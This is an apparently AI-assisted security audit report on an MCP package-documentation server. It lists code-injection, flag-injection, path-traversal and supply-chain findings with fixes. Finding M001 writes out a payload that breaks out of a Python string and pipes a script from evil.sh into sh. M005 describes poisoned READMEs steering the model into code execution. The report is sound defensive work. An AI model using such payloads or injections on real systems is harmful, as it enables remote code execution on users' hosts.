# Agent & MCP security report

Scanned: `/tmp/blind/c17` · 2026-11-23T20:35:58+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 2 | 0 | 1 | 3 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **13** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · Python package name and symbol are pasted into Python source run with python3 -c
`None:None` · ASI05 Unexpected Code Execution

describe_python_package / lookup_python_doc (and search_package_docs with language=python) only check that package is a string, then build Python code from it. package = "os');__import__('os').system('curl evil.sh|sh');('" closes the string and runs any command as the user running the server; symbol is injected the same way into help(...). execFile avoids a shell but python -c executes the code itself.
> `src/package-docs-server.ts:1864` — `const { package: packageName, symbol } = args`
> `src/package-docs-server.ts:396` — `spec = importlib.util.find_spec('${packageName}')`
> `src/package-docs-server.ts:399` — `const { stdout } = await safePythonExec(pythonCode)`

**Fix:** Do not build code from input: validate package with ^[A-Za-z0-9_.-]+$ (and symbol with ^[A-Za-z_][A-Za-z0-9_.]*$), and pass them as argv: execFile('python3', ['-c', 'import sys,importlib.util; print(importlib.util.find_spec(sys.argv[1]) is not None)', pkg]); use pydoc via `python3 -m pydoc <name>` with validated names.

### M002 · CRITICAL · Same Python injection reachable from search_package_docs
`None:None` · ASI05 Unexpected Code Execution

search_package_docs with language 'python' passes the raw package argument into the same find_spec template, so the code injection in M001 is reachable through a second tool.
> `src/package-docs-server.ts:714` — `const { package: packageName, query, language, fuzzy = true, projectPath } = args`
> `src/package-docs-server.ts:1035` — `isInstalled = await this.isPythonPackageInstalledLocally(packageName)`
> `src/package-docs-server.ts:396` — `spec = importlib.util.find_spec('${packageName}')`

**Fix:** Same fix as M001 (validate and pass as argv) in isPythonPackageInstalledLocally, which covers both tools.

### M005 · MEDIUM · Third-party READMEs and package metadata go straight into the model context
`None:None` · 

README text, descriptions and example files written by any package author (npm, PyPI, crates.io, GitHub) are returned to the model without marking them as untrusted; a poisoned README can carry instructions, and combined with M001 an injected instruction can lead to code execution on the host.
> `src/package-docs-server.ts:2028` — `const response = await axios.get(readmeUrl)`
> `src/package-docs-server.ts:258` — `if (request.params.name === "get_npm_package_doc") {`
> `src/package-docs-server.ts:279` — `text: markdown,`

**Fix:** Wrap returned documentation in clearly delimited untrusted-content markers and fix M001 so no tool can be steered into executing code.

### M003 · LOW · Go sanitiser keeps a leading '-', so package names can become go flags
`None:None` · ASI02 Tool Misuse and Exploitation

The allowlist removes shell characters and '=' but allows a leading '-', so a package like '-json' or '-m' is read by go as a flag. With no '=' or spaces only single bare flags fit, so impact is limited (no code execution found).
> `src/package-docs-server.ts:37` — `return input.replace(/[^a-zA-Z0-9.\-_/]/g, '')`
> `src/package-docs-server.ts:62` — `return await execFileAsync('go', ['list', '-f', '{{.Dir}}', sanitisedPackage])`

**Fix:** Reject names starting with '-' and put '--' before the package argument for go doc / go list.

### M004 · LOW · npm package name / projectPath read package.json and README from any directory
`None:None` · ASI02 Tool Misuse and Exploitation

packageName '../../../other/project' (or any projectPath) makes the server read package.json and README files outside node_modules and return their description, usage/example sections and dependency lists. Only those file names are read, so the exposure is limited to project metadata.
> `src/package-docs-server.ts:714` — `const { package: packageName, query, language, fuzzy = true, projectPath } = args`
> `src/package-docs-server.ts:554` — `const packagePath = join(basePath, "node_modules", packageName)`
> `src/package-docs-server.ts:573` — `const readme = readFileSync(readmePath, "utf-8")`

**Fix:** Validate package names with the npm name regex (^(@[a-z0-9-~][a-z0-9-._~]*/)?[a-z0-9-~][a-z0-9-._~]*$) and check the resolved path stays under <projectPath>/node_modules.

### M006 · LOW · Optional LSP mode installs unpinned npm packages at runtime
`None:None` · ASI04 Agentic Supply Chain

With ENABLE_LSP=true and the server binary missing, the server runs npm install of the latest, unpinned language-server packages at runtime and then executes them. The package names are constants (no injection), but the code that runs can change between starts.
> `src/lsp/typescript-lsp-client.ts:143` — `'typescript-language-server': 'typescript-language-server typescript',`
> `src/lsp/typescript-lsp-client.ts:50` — `await exec(`npm install --no-save ${packageName}`);`

**Fix:** Pin versions (e.g. typescript-language-server@4.x.y) or require the operator to install the language servers ahead of time.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
